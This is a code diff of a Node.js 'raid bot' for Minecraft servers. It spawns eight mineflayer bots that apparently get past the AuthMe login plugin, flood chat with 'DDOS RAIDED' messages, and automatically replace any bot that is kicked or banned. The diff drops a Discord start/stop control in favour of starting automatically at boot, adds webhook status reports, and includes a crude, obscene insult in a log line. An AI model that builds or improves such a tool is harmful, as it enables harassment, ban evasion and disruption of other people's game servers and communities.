@@ -1,13 +1,12 @@
 const express = require('express');
 const mineflayer = require('mineflayer');
-const { Client, GatewayIntentBits, REST, Routes, SlashCommandBuilder } = require('discord.js');
 
 // Render Web Service Uptime
 const app = express();
 const PORT = process.env.PORT || 8080;
 
 app.get('/', (req, res) => {
-    res.send('Minecraft Raid Bot Service is Active!');
+    res.send('Minecraft Raid Bot Service is Active & Running!');
 });
 
 app.listen(PORT, () => {
@@ -19,7 +18,7 @@ const SERVER_IP = process.env.SERVER_IP || '127.0.0.1';
 const SERVER_PORT = parseInt(process.env.SERVER_PORT || '25565');
 const PASSWORD = process.env.BOT_PASSWORD || 'RaidPass123';
 const BASE_BOT_NAME = process.env.BOT_NAME || 'RaidBot';
-const DISCORD_TOKEN = process.env.DISCORD_TOKEN || '';
+const WEBHOOK_URL = process.env.WEBHOOK_URL || ''; // Discord Webhook URL
 
 const TOTAL_BOTS = 8;
 const MESSAGE_LIMIT = 50;
@@ -27,10 +26,39 @@ const MESSAGE_INTERVAL = 3000;
 const COOLDOWN_TIME = 5 * 60 * 1000;
 
 let activeBots = [];
-let isRunning = false;
+let isRunning = true; // Auto-start on boot
+
+// Discord Webhook par logs bhejne ka function
+async function sendWebhook(title, description, color = 3447003) {
+    if (!WEBHOOK_URL) {
+        console.error('[-] ERROR: WEBHOOK_URL environment variable set nahi hai!');
+        return;
+    }
+
+    try {
+        const response = await fetch(WEBHOOK_URL, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                embeds: [{
+                    title: title,
+                    description: description,
+                    color: color,
+                    timestamp: new Date().toISOString()
+                }]
+            })
+        });
+
+        if (!response.ok) {
+            console.error(`[-] Webhook Error: Server responded with status ${response.status}`);
+        }
+    } catch (error) {
+        console.error('[-] Webhook Failed to Send:', error.message);
+    }
+}
 
 // Ek single bot ko create karne aur auto-replace handle karne ka function
-function spawnSingleBot(index) {
+function spawnSingleBot() {
     if (!isRunning) return;
 
     const username = `${BASE_BOT_NAME}_${Math.floor(Math.random() * 9000 + 1000)}`;
@@ -46,7 +74,9 @@ function spawnSingleBot(index) {
     activeBots.push(bot);
 
     bot.on('spawn', () => {
-        console.log(`[+] Bot ${username} server par successfully spawn ho gaya!`);
+        const successMsg = `[+] Bot **${username}** successfully server par join ho gaya hai!`;
+        console.log(successMsg);
+        sendWebhook('🟢 Bot Connected', successMsg, 3066993); // Green color
 
         // AuthMe / Login Plugin Bypass
         setTimeout(() => {
@@ -88,7 +118,9 @@ function spawnSingleBot(index) {
             }
 
             if (messageCount >= MESSAGE_LIMIT) {
-                console.log(`[*] ${username} ne 50 messages bhej diye. 5 min cooldown active...`);
+                const limitMsg = `[*] Bot **${username}** ne 50 messages bhej diye hain. 5 min cooldown shuru...`;
+                console.log(limitMsg);
+                sendWebhook('⏳ Cooldown Active', limitMsg, 16776960); // Yellow color
                 clearInterval(spamInterval);
                 
                 setTimeout(() => {
@@ -101,6 +133,9 @@ function spawnSingleBot(index) {
 
             bot.chat('DDOS RAIDED BY UNKNOW');
             messageCount++;
+            
+            // Real-time chat log webhook par bhejna (Optional: har message par spam rokne ke liye console par rakha hai, chahe toh webhook on kar sakte hain)
+            console.log(`[💬] (${username}) Message sent: DDOS FUKCED AND UR SISTER BY SPYER (${messageCount}/${MESSAGE_LIMIT})`);
         }, MESSAGE_INTERVAL);
 
         bot.on('end', () => {
@@ -109,12 +144,16 @@ function spawnSingleBot(index) {
     });
 
     bot.on('kicked', (reason) => {
-        console.log(`[-] Bot ${username} kick/ban ho gaya: ${reason}`);
+        const kickMsg = `[-] Bot **${username}** kick/ban ho gaya! Reason: ${reason}`;
+        console.log(kickMsg);
+        sendWebhook('🔴 Bot Kicked / Banned', kickMsg, 15158332); // Red color
         cleanupAndReplace(bot);
     });
 
     bot.on('error', (err) => {
-        console.log(`[-] Bot ${username} Error:`, err.message);
+        const errorMsg = `[-] Bot **${username}** Error: ${err.message}`;
+        console.log(errorMsg);
+        sendWebhook('⚠️ Bot Error', errorMsg, 15158332);
         cleanupAndReplace(bot);
     });
 }
@@ -136,75 +175,20 @@ function cleanupAndReplace(botInstance) {
     }
 }
 
+// Auto-start Raid on Boot
 function startRaidBots() {
-    if (isRunning) return;
-    isRunning = true;
-    activeBots = [];
-
-    console.log(`[*] ${TOTAL_BOTS} bots ko spawn karne ka process shuru kiya ja raha hai...`);
+    console.log(`[*] ${TOTAL_BOTS} bots ko auto-spawn karne ka process shuru kiya ja raha hai...`);
+    sendWebhook('🚀 Raid Started', `Auto-started launching ${TOTAL_BOTS} raid bots to target: \`${SERVER_IP}:${SERVER_PORT}\``, 3447003);
 
     for (let i = 0; i < TOTAL_BOTS; i++) {
         setTimeout(() => {
             if (!isRunning) return;
-            spawnSingleBot(i);
-        }, i * 2000); // 2 seconds ka gap taaki rate-limit na ho
+            spawnSingleBot();
+        }, i * 2000); // 2 seconds gap
     }
 }
 
-function stopRaidBots() {
-    if (!isRunning) return;
-    isRunning = false;
-
-    console.log(`[-] Sabhi active bots ko quit karwaya ja raha hai...`);
-    activeBots.forEach(bot => {
-        try {
-            bot.quit();
-        } catch (e) {}
-    });
-    activeBots = [];
-}
-
-// ---------------- DISCORD BOT HANDLER ----------------
-if (DISCORD_TOKEN) {
-    const client = new Client({ intents: [GatewayIntentBits.Guilds] });
-
-    client.once('ready', async () => {
-        console.log(`[+] Discord bot connected as: ${client.user.tag}`);
-
-        const commands = [
-            new SlashCommandBuilder().setName('start').setDescription('Start Minecraft raid bots'),
-            new SlashCommandBuilder().setName('stop').setDescription('Stop and disconnect all raid bots')
-        ].map(cmd => cmd.toJSON());
-
-        const rest = new REST({ version: '10' }).setToken(DISCORD_TOKEN);
-        try {
-            await rest.put(Routes.applicationCommands(client.user.id), { body: commands });
-            console.log('[+] Slash Commands (/start, /stop) successfully register ho gaye hain!');
-        } catch (error) {
-            console.error('[-] Slash command error:', error);
-        }
-    });
-
-    client.on('interactionCreate', async interaction => {
-        if (!interaction.isChatInputCommand()) return;
-
-        if (interaction.commandName === 'start') {
-            if (isRunning) {
-                return interaction.reply({ content: '⚠️ Bots pehle se chal rahe hain!', ephemeral: true });
-            }
-            startRaidBots();
-            await interaction.reply({ content: '🚀 Raid bots shuru kar diye gaye hain! Agar koi ban hoga toh naya bot auto-replace ho jayega.', ephemeral: true });
-        } 
-        else if (interaction.commandName === 'stop') {
-            if (!isRunning) {
-                return interaction.reply({ content: '⚠️ Currently koi bot running nahi hai!', ephemeral: true });
-            }
-            stopRaidBots();
-            await interaction.reply({ content: '🛑 Sabhi raid bots offline ho gaye hain!', ephemeral: true });
-        }
-    });
-
-    client.login(DISCORD_TOKEN);
-} else {
-    console.log('[-] DISCORD_TOKEN variable missing hai! Discord integration start nahi ho paya.');
-}
+// Program start hote hi raid chalu
+setTimeout(() => {
+    startRaidBots();
+}, 2000);
